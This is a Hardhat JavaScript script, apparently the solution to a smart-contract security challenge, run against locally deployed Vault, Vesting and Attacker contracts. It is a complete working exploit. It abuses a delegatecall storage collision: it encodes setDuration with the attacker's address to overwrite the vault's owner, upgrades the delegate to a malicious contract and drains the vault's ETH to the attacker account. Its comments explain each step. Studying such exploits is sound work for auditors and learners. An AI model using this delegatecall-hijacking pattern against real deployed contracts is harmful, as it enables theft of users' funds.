const { ethers } = require("hardhat");

async function main() {
    const [owner, attacker] = await ethers.getSigners();
    console.log("## OWNER ACCOUNT: ", owner.address);
    console.log("## ATTACK ACCOUNT: ", attacker.address);

    const attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`## ATTACKER HAS AN INITIAL BALANCE OF: ${ethers.utils.formatEther(attackerBalance)} ETH`);

    //Deploy delegate
    const vestingFactory = await ethers.getContractFactory("Vesting");
    const vestingContract = await vestingFactory.deploy();
    await vestingContract.deployed();
    console.log("## VESTING CONTRACT DEPLOYED TO: ", vestingContract.address);

    //Deploy vault
    const vaultFactory = await ethers.getContractFactory("Vault");
    const vaultContract = await vaultFactory.deploy(vestingContract.address);
    await vaultContract.deployed();
    console.log("## VAULT CONTRACT DEPLOYED TO: ", vaultContract.address);

    //Deploy attacker
    const attackerFactory = await ethers.getContractFactory("Attacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();
    console.log("## ATTACKER CONTRACT DEPLOYED TO: ", attackerContract.address);

    //Deposit ETH to Vault
    const depositTxObject = {
        to: vaultContract.address,
        value: ethers.utils.parseEther("1")
    };
    await owner.sendTransaction(depositTxObject);
    console.log("## DEPOSIT MADE");

    const vaultBalance = await ethers.provider.getBalance(vaultContract.address);
    console.log(`## VAULT NOW HAS: ${ethers.utils.formatEther(vaultBalance)} ETH`);

    //Set duration and change the owner to our attacker account
    const ownerAsUint = ethers.BigNumber.from(owner.address);
    const attackerAsUint = ethers.BigNumber.from(attacker.address);

    /* Check that our attacker address as a uint is bigger than the current vesting duration. You could simply deploy a contract using CREATE2 and use it as the attacker account.
     * But since we are running this locally and have many accounts to choose from, it is easy to find one that works.
    */
    if (attackerAsUint.lte(ownerAsUint)) {
        console.log("## WON'T WORK BECAUSE THE SET DURATION VERIFICATION WILL FAIL. TRY ANOTHER ATTACK ADDRESS!");
        return;
    }
    let setDurationFunctionABI = [`function setDuration(uint256)`];
    let interface = new ethers.utils.Interface(setDurationFunctionABI);
    let encodedData = interface.encodeFunctionData("setDuration", [attackerAsUint]);

    /* We need to call via execute and using the Vault own address because we want it to go to the fallback function.
     * Since the Vault has no setDuration function, the fallback function will be executed.
     * The fallback function will in turn call the _delegate function which has an onlyAuth modifier. This is why we must call it this way, otherwise the msg.sender wouldn't be the owner, i.e the Vault itself.
    */
    await vaultContract.execute(vaultContract.address, encodedData);
    console.log("## CHANGED OWNER");

    //Sice we are the new owners, we can upgrade the delegate to our attacker contract
    await vaultContract.connect(attacker).upgradeDelegate(attackerContract.address);
    console.log("## UPGRADED DELEGATE");

    /* Withdraw the funds to our attacker account via delegatecall
     * This can't be done via the execute function like before, otherwise the funds will be withdrawn to the Vault contract.
     * So we just send a transaction to the vault calling withdraw using our attacker account, which will end up in the fallback function.
     * The fallback function will call _delegate, which will work because the our attacker account is the owner of the vault.
     * _delegate will call our attacker contract which will withdraw the Vault funds to the msg.sender, which is our attacker account.
    */
    let withdrawFunctionABI = [`function withdraw()`];
    let interfaceWithdraw = new ethers.utils.Interface(withdrawFunctionABI);
    let encodedWithdrawData = interfaceWithdraw.encodeFunctionData("withdraw");
    const withdrawTxObject = {
        to: vaultContract.address,
        data: encodedWithdrawData
    };

    await attacker.sendTransaction(withdrawTxObject);
    console.log("## WITHDREW");

    const newAttackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log(`## ATTACKER NOW HAS A BALANCE OF: ${ethers.utils.formatEther(newAttackerBalance)} ETH`);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error);
        process.exit(1);
    });